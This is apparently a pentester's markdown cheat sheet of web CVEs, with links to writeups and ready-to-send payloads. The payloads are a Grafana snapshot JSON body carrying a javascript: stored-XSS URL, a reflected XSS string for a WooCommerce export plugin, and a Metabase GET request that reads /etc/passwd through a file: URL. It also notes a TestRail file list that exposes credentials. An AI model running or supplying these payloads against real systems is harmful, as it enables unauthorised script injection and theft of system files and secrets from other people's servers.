## CVE-2020-11022/CVE-2020-11023

https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html

## CVE-2020-11110
https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html

* version : Grafana v6.2.5

* authentication : v6.2.5 not required to be authenticated

* send post request to /api/snapshots with the following json body
```
{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```





## CVE-2021-24169
WordPress Plugin Advanced Order Export For WooCommerce 3.1.7 - Reflected Cross-Site Scripting (XSS)

```
wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(1)</script>
```

## CVE-2021-40875 
Improper Access Control in Gurock TestRail versions ≤ 7.2.0.3014 results in sensitive file exposure

* /files.md5 file on the client side of a Gurock TestRail application, disclosing a full list of application files and the corresponding file paths. The corresponding file paths can be tested, and in some cases, result in the disclosure hardcoded credentials, API keys, or other sensitive data.


## CVE-2021-26084 
Remote Code Execution on Confluence Servers

https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

## CVE-2021–24563 Unauthenticated Stored XSS [Frontend Uploader <= 1.3.2]
https://medium.com/pentesternepal/cve-2021-24563-unauthenticated-stored-xss-frontend-uploader-1-3-2-8522e0890833


## CVE-2021-38647 is an unauthenticated RCE vulnerability effecting the OMI agent as root.
https://github.com/horizon3ai/CVE-2021-38647

## Metabase 敏感信息泄露 CVE-2021-41277
```
GET /api/geojson?url=file:/etc/passwd HTTP/1.1
Host:
```








## Full Disclosed reports
https://seclists.org/fulldisclosure/





